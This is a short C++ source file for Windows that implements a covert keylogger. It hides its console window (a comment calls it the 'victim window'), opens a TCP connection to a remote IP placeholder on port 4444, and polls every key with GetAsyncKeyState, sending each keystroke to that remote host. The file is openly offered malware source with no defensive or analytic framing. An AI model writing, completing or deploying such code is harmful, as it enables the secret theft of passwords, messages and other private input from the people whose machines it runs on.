#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#include <winuser.h>
#pragma comment(lib, "Ws2_32.lib")
using namespace std;

int main() {
 WSADATA wsaData;
 SOCKET s;
 struct sockaddr_in server;
 int my_result;

 void HideConsole();
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //To hide victim window.
}
 my_result = WSAStartup(MAKEWORD(2,2), &wsaData);	
 	if (my_result != 0) {
 		printf("WSAStartup failed: %d\n", my_result);
 		return 1; 		
	 }
	 printf("Initialised.\n");
	 if ((s = socket(AF_INET , SOCK_STREAM , 0)) == INVALID_SOCKET)
	 {
	 	printf("COULD NOT CREATE SOCKET : %d", WSAGetLastError());
	 }
	 printf("Socket Created.\n");
     server.sin_addr.s_addr = inet_addr("Enetr-your-remote-IP-address-here."); //Connecting to IP address.
	 server.sin_family = AF_INET;
	 server.sin_port = htons(4444); //select port to connect to
	//The code below is to establish connection to remote server
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
		{
			puts("connect error");
			return 1;
		}
		while (true) {
		Sleep(10);
		for (int KEY = 0x8; KEY < 0xFF; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {

					char buffer[2];
					buffer[0] = KEY;
					send(s, buffer, sizeof(buffer), 0);
			}
		}
	}
}
